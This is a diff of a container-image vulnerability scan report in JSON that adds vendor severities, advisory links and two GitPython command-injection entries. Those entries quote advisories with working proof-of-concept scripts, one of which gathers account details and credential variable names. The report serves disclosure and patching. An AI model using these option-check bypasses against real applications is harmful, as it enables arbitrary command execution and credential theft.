@@ -1,6 +1,6 @@
 {
   "SchemaVersion": 2,
-  "CreatedAt": "2026-05-05T13:41:58.07498162Z",
+  "CreatedAt": "2026-05-06T23:59:33.630612523Z",
   "ArtifactName": "hypercode-core:latest",
   "ArtifactType": "container_image",
   "Metadata": {
@@ -587,7 +587,8 @@
             "oracle-oval": 3,
             "photon": 3,
             "redhat": 3,
-            "rocky": 3
+            "rocky": 3,
+            "ubuntu": 2
           },
           "CVSS": {
             "redhat": {
@@ -606,12 +607,13 @@
             "https://bugzilla.redhat.com/show_bug.cgi?id=2448754",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27135",
             "https://errata.almalinux.org/9/ALSA-2026-7896.html",
-            "https://errata.rockylinux.org/RLSA-2026:7666",
+            "https://errata.rockylinux.org/RLSA-2026:7668",
             "https://github.com/nghttp2/nghttp2/commit/5c7df8fa815ac1004d9ecb9d1f7595c4d37f46e1",
             "https://github.com/nghttp2/nghttp2/security/advisories/GHSA-6933-cjhr-5qg6",
             "https://linux.oracle.com/cve/CVE-2026-27135.html",
             "https://linux.oracle.com/errata/ELSA-2026-8339.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-27135",
+            "https://ubuntu.com/security/notices/USN-8233-1",
             "https://www.cve.org/CVERecord?id=CVE-2026-27135"
           ],
           "PublishedDate": "2026-03-18T18:16:26.723Z",
@@ -644,8 +646,10 @@
             "CWE-269"
           ],
           "VendorSeverity": {
+            "alma": 2,
             "azure": 2,
             "cbl-mariner": 2,
+            "oracle-oval": 2,
             "photon": 3,
             "redhat": 2,
             "ubuntu": 2
@@ -657,7 +661,10 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:13677",
             "https://access.redhat.com/security/cve/CVE-2026-29111",
+            "https://bugzilla.redhat.com/2450505",
+            "https://errata.almalinux.org/9/ALSA-2026-13677.html",
             "https://github.com/systemd/systemd/commit/1d22f706bd04f45f8422e17fbde3f56ece17758a",
             "https://github.com/systemd/systemd/commit/20021e7686426052e3a7505425d7e12085feb2a6",
             "https://github.com/systemd/systemd/commit/21167006574d6b83813c7596759b474f56562412",
@@ -669,6 +676,8 @@
             "https://github.com/systemd/systemd/commit/b5fd14693057e5f2c9b4a49603be64ec3608ff6c",
             "https://github.com/systemd/systemd/commit/efa6ba2ab625aaa160ac435a09e6482fc63bdbe8",
             "https://github.com/systemd/systemd/security/advisories/GHSA-gx6q-6f99-m764",
+            "https://linux.oracle.com/cve/CVE-2026-29111.html",
+            "https://linux.oracle.com/errata/ELSA-2026-13677.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-29111",
             "https://ubuntu.com/security/notices/USN-8119-1",
             "https://ubuntu.com/security/notices/USN-8119-2",
@@ -773,8 +782,10 @@
             "CWE-269"
           ],
           "VendorSeverity": {
+            "alma": 2,
             "azure": 2,
             "cbl-mariner": 2,
+            "oracle-oval": 2,
             "photon": 3,
             "redhat": 2,
             "ubuntu": 2
@@ -786,7 +797,10 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:13677",
             "https://access.redhat.com/security/cve/CVE-2026-29111",
+            "https://bugzilla.redhat.com/2450505",
+            "https://errata.almalinux.org/9/ALSA-2026-13677.html",
             "https://github.com/systemd/systemd/commit/1d22f706bd04f45f8422e17fbde3f56ece17758a",
             "https://github.com/systemd/systemd/commit/20021e7686426052e3a7505425d7e12085feb2a6",
             "https://github.com/systemd/systemd/commit/21167006574d6b83813c7596759b474f56562412",
@@ -798,6 +812,8 @@
             "https://github.com/systemd/systemd/commit/b5fd14693057e5f2c9b4a49603be64ec3608ff6c",
             "https://github.com/systemd/systemd/commit/efa6ba2ab625aaa160ac435a09e6482fc63bdbe8",
             "https://github.com/systemd/systemd/security/advisories/GHSA-gx6q-6f99-m764",
+            "https://linux.oracle.com/cve/CVE-2026-29111.html",
+            "https://linux.oracle.com/errata/ELSA-2026-13677.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-29111",
             "https://ubuntu.com/security/notices/USN-8119-1",
             "https://ubuntu.com/security/notices/USN-8119-2",
@@ -956,6 +972,84 @@
       "Class": "lang-pkgs",
       "Type": "python-pkg",
       "Vulnerabilities": [
+        {
+          "VulnerabilityID": "CVE-2026-42215",
+          "PkgName": "GitPython",
+          "PkgPath": "usr/local/lib/python3.11/site-packages/gitpython-3.1.45.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.45",
+            "UID": "815b95a9c29123ee"
+          },
+          "InstalledVersion": "3.1.45",
+          "FixedVersion": "3.1.47",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:097275d67fcdb97071c047b4b80f7ba07ac6e2de12e1f594ea95528c0ad359f1",
+            "DiffID": "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42215",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Title": "GitPython has Command Injection via Git options bypass",
+          "Description": "### Summary\nGitPython blocks dangerous Git options such as `--upload-pack` and `--receive-pack` by default, but the equivalent Python kwargs `upload_pack` and `receive_pack` bypass that check. If an application passes attacker-controlled kwargs into `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`, this leads to arbitrary command execution even when `allow_unsafe_options` is left at its default value of `False`.\n\n### Details\nGitPython explicitly treats helper-command options as unsafe because they can be used to execute arbitrary commands:\n\n- `git/repo/base.py:145-153` marks clone options such as `--upload-pack`, `-u`, `--config`, and `-c` as unsafe.\n- `git/remote.py:535-548` marks fetch/pull/push options such as `--upload-pack`, `--receive-pack`, and `--exec` as unsafe.\n\nThe vulnerable API paths check the raw kwarg names before they're its normalized into command-line flags:\n\n- `Repo.clone_from()` checks `list(kwargs.keys())` in `git/repo/base.py:1387-1390`\n- `Remote.fetch()` checks `list(kwargs.keys())` in `git/remote.py:1070-1071`\n- `Remote.pull()` checks `list(kwargs.keys())` in `git/remote.py:1124-1125`\n- `Remote.push()` checks `list(kwargs.keys())` in `git/remote.py:1197-1198`\n\nThat validation is performed by `Git.check_unsafe_options()` in `git/cmd.py:948-961`. The validator correctly blocks option names such as `upload-pack`, `receive-pack`, and `exec`.\n\nLater, GitPython converts Python kwargs into Git command-line flags in `Git.transform_kwarg()` at `git/cmd.py:1471-1484`. During that step, underscore-form kwargs are dashified:\n\n- `upload_pack=...` becomes `--upload-pack=...`\n- `receive_pack=...` becomes `--receive-pack=...`\n\nBecause the unsafe-option check runs before this normalization, underscore-form kwargs bypass the safety check even though they become the exact dangerous Git flags that the code is supposed to reject.\n\nIn practice:\n\n- `remote.fetch(**{\"upload-pack\": helper})` is blocked with `UnsafeOptionError`\n- `remote.fetch(upload_pack=helper)` is allowed and reaches helper execution\n\nThe same bypass works for:\n\n```python\nRepo.clone_from(origin, out, upload_pack=helper)\nrepo.remote(\"origin\").fetch(upload_pack=helper)\nrepo.remote(\"origin\").pull(upload_pack=helper)\nrepo.remote(\"origin\").push(receive_pack=helper)\n```\n\nThis does not appear to affect every unsafe option. For example, `exec=` is already rejected because the raw kwarg name `exec` matches the blocked option name before normalization.\n\nExisting tests cover the hyphenated form, not the vulnerable underscore form. For example:\n\n- `test/test_clone.py:129-136` checks `{\"upload-pack\": ...}`\n- `test/test_remote.py:830-833` checks `{\"upload-pack\": ...}`\n- `test/test_remote.py:968-975` checks `{\"receive-pack\": ...}`\n\nThose tests correctly confirm the literal Git option names are blocked, but they do not exercise the normal Python kwarg spelling that bypasses the guard.\n\n### PoC\n1. Create and activate a virtual environment in the repository root:\n\n```bash\npython3 -m venv .venv-sec\n.venv-sec/bin/pip install setuptools gitdb\nsource ./.venv-sec/bin/activate\n```\n\n2. make a new python file and put the following in there, then run it:\n\n```python\nimport os\nimport stat\nimport subprocess\nimport tempfile\n\nfrom git import Repo\nfrom git.exc import UnsafeOptionError\n\n# Setup: create isolated repositories so the PoC uses a normal fetch flow.\nbase = tempfile.mkdtemp(prefix=\"gp-poc-risk-\")\norigin = os.path.join(base, \"origin.git\")\nproducer = os.path.join(base, \"producer\")\nvictim = os.path.join(base, \"victim\")\nproof = os.path.join(base, \"proof.txt\")\nwrapper = os.path.join(base, \"wrapper.sh\")\n\n# Setup: this wrapper is just to demo things you can do, not required for the exploit to work\n# you could also do something like an SSH reverse shell, really anything\nwith open(wrapper, \"w\") as f:\n    f.write(f\"\"\"#!/bin/sh\n{{\n  echo \"code_exec=1\"\n  echo \"whoami=$(id)\"\n  echo \"cwd=$(pwd)\"\n  echo \"uname=$(uname -a)\"\n  printf 'argv='; printf '\u003c%s\u003e' \"$@\"; echo\n  env | grep -E '^(HOME|USER|PATH|SSH_AUTH_SOCK|CI|GITHUB_TOKEN|AWS_|AZURE_|GOOGLE_)=' | sed 's/=.*$/=\u003credacted\u003e/' || true\n}} \u003e '{proof}'\nexec git-upload-pack \"$@\"\n\"\"\")\nos.chmod(wrapper, stat.S_IRWXU)\n\nsubprocess.run([\"git\", \"init\", \"--bare\", origin], check=True, stdout=subprocess.DEVNULL)\nsubprocess.run([\"git\", \"clone\", origin, producer], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\nwith open(os.path.join(producer, \"README\"), \"w\") as f:\n    f.write(\"x\")\n\nsubprocess.run([\"git\", \"-C\", producer, \"add\", \"README\"], check=True, stdout=subprocess.DEVNULL)\nsubprocess.run(\n    [\"git\", \"-C\", producer, \"-c\", \"user.name=t\", \"-c\", \"user.email=t@t\", \"commit\", \"-m\", \"init\"],\n    check=True,\n    stdout=subprocess.DEVNULL,\n)\nsubprocess.run([\"git\", \"-C\", producer, \"push\", \"origin\", \"HEAD\"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\nsubprocess.run([\"git\", \"clone\", origin, victim], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\nrepo = Repo(victim)\nremote = repo.remote(\"origin\")\n\n# the literal Git option name is properly blocked.\ntry:\n    remote.fetch(**{\"upload-pack\": wrapper})\n    print(\"control=unexpected_success\")\nexcept UnsafeOptionError:\n    print(\"control=blocked\")\n\n# this is the actual vulnerability\n# you can also just do upload_pack=\"touch /tmp/proof\", the wrapper is just to show greater impact\n# if you do the \"touch /tmp/proof\" the script will crash, but the file will have been created\nremote.fetch(upload_pack=wrapper)\n\n# Proof: the helper ran as the GitPython host process.\nprint(\"proof_exists\", os.path.exists(proof), proof)\nprint(open(proof).read())\n```\n\n3. Expected result:\n\n- The script prints `control=blocked`\n- The script prints `proof_exists True ...`\n- The proof file contains evidence that the attacker-controlled helper executed as the local application account, including `id`, working directory, argv, and selected environment variable names\n\nExample output:\n\n```bash\nGitPython % python3 test.py\ncontrol=blocked\nproof_exists True /var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/proof.txt\ncode_exec=1\nwhoami=uid=501(wes) gid=20(staff) \u003credacted\u003e\ncwd=/private/var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/victim\nuname=Darwin  \u003credacted\u003e Darwin Kernel Version  \u003credacted\u003e; root:xnu-11417. \u003credacted\u003e\nargv=\u003c/var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/origin.git\u003e\nUSER=\u003credacted\u003e\nSSH_AUTH_SOCK=\u003credacted\u003e\nPATH=\u003credacted\u003e\nHOME=\u003credacted\u003e\n```\n\nThis PoC does not require a malicious repository. The PoC uses that fresh blank repository. The only attacker-controlled input is the kwarg that GitPython turns into `--upload-pack`.\n\n### Impact\nWho is impacted:\n- Web applications that let users configure repository import, sync, mirroring, fetch, pull, or push behavior\n- Systems that accept a user-provided dict of \"extra Git options\" and pass it into GitPython with `**kwargs`\n- CI/CD systems, workers, automation bots, or internal tools that build GitPython calls from untrusted integration settings or job definitions (yaml, json, etc configs )\n\nWhat the attacker needs to control:\n\n- A value that becomes `upload_pack` or `receive_pack` in the kwargs passed to `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`\n\nFrom a severity perspective, this could lead to\n- Theft of SSH keys, deploy credentials, API tokens, or cloud credentials available to the process\n- Modification of repositories, build outputs, or release artifacts\n- Lateral movement from CI/CD workers or automation hosts\n- Full compromise of the worker or service process handling repository operations\n\nThe highest-risk environments are network-reachable services and automation systems that expose these GitPython kwargs across a trust boundary while relying on the default unsafe-option guard for protection.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 8.8
+            }
+          },
+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rpm5-65cw-6hj4"
+          ]
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42284",
+          "PkgName": "GitPython",
+          "PkgPath": "usr/local/lib/python3.11/site-packages/gitpython-3.1.45.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.45",
+            "UID": "815b95a9c29123ee"
+          },
+          "InstalledVersion": "3.1.45",
+          "FixedVersion": "3.1.47",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:097275d67fcdb97071c047b4b80f7ba07ac6e2de12e1f594ea95528c0ad359f1",
+            "DiffID": "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42284",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Title": "GitPython: Unsafe option check validates multi_options before shlex.split transformation",
+          "Description": "### Summary\n\n`_clone()` validates `multi_options` as the original list, then executes `shlex.split(\" \".join(multi_options))`. A string like `\"--branch main --config core.hooksPath=/x\"` passes validation (starts with `--branch`), but after split becomes `[\"--branch\", \"main\", \"--config\", \"core.hooksPath=/x\"]`. Git applies the config and executes attacker hooks during clone.\n\n### Details\n\nThe vulnerable code is in [`git/repo/base.py` line 1383](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1383):\n```python\nmulti = shlex.split(\" \".join(multi_options))\n```\n\nThen validation runs on the **original** list at [line 1390](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1390):\n```python\nGit.check_unsafe_options(options=multi_options, unsafe_options=cls.unsafe_git_clone_options)\n```\n\nThen execution uses the **transformed** result at [line 1392](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1392):\n```python\nproc = git.clone(multi, \"--\", url, path, ...)\n```\n\nThe [check at `git/cmd.py` line 959](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/cmd.py#L959) uses `startswith`:\n```python\nif option.startswith(unsafe_option) or option == bare_option:\n```\n\n`\"--branch main --config ...\"` does not start with `\"--config\"`, so it passes. After `shlex.split`, `\"--config\"` becomes its own token and reaches git.\n\nAlso affects `Submodule.update()` via `clone_multi_options`.\n\n### PoC\n\n```python\nimport sys, pathlib, subprocess\nsys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))\n\nfrom git import Repo\nfrom git.exc import UnsafeOptionError\n\ntry:\n    Repo.clone_from(\"/nonexistent\", \"/tmp/x\", multi_options=[\"--config\", \"core.hooksPath=/x\"])\nexcept UnsafeOptionError:\n    print(\"multi_options=['--config', '...']: Block as expected\")\nexcept Exception:\n    pass\n\nDIR = pathlib.Path(__file__).resolve().parent / \"workdir_b\"\nSRC = DIR / \"repo\"\nDST = DIR / \"dst\"\nHOOKS = DIR / \"hooks\"\nLOG = DIR / \"output.log\"\n\nif not SRC.exists():\n    SRC.mkdir(parents=True)\n    r = lambda *a: subprocess.run(a, cwd=SRC, capture_output=True)\n    r(\"git\", \"init\", \"-b\", \"main\")\n    (SRC / \"f\").write_text(\"x\\n\")\n    r(\"git\", \"add\", \".\")\n    r(\"git\", \"commit\", \"-m\", \"init\")\n\nHOOKS.mkdir(exist_ok=True)\nhook = HOOKS / \"post-checkout\"\nhook.write_text(f\"#!/bin/sh\\nwhoami \u003e {LOG.as_posix()}\\nhostname \u003e\u003e {LOG.as_posix()}\\n\")\nhook.chmod(0o755)\n\nLOG.unlink(missing_ok=True)\npayload = \"--branch main --config core.hooksPath=\" + HOOKS.as_posix()\n\ntry:\n    Repo.clone_from(str(SRC), str(DST), multi_options=[payload])\nexcept UnsafeOptionError:\n    print(f\"multi_options=['{payload}']: BLOCKED\"); sys.exit(1)\nexcept Exception:\n    pass\n\nif not LOG.exists() and DST.exists():\n    subprocess.run([\"git\", \"checkout\", \"--force\", \"main\"], cwd=DST, capture_output=True)\n\nprint(f\"multi_options=['{payload}']: not blocked\")\nprint(f\"\\nHook executed: {LOG.exists()}\")\nif LOG.exists():\n    print(LOG.read_text().strip())\n```\n\n**Output:**\n```\nmulti_options=['--config', '...']: Block as expected\nmulti_options=['--branch main --config core.hooksPath=.../hooks']: not blocked\n\nHook executed: True\ntexugo\nDESKTOP-5w5HH79\n```\n\n### Impact\n\nAny application passing user input to `multi_options` in `clone_from()`, `clone()`, or `Submodule.update()` is vulnerable. Attacker embeds `--config core.hooksPath=\u003cdir\u003e` inside a string starting with a safe option. Check does not block it. Git executes attacker code. Same class as CVE-2023-40267.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 8.1
+            }
+          },
+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-x2qx-6953-8485"
+          ]
+        },
         {
           "VulnerabilityID": "CVE-2024-23342",
           "PkgName": "ecdsa",
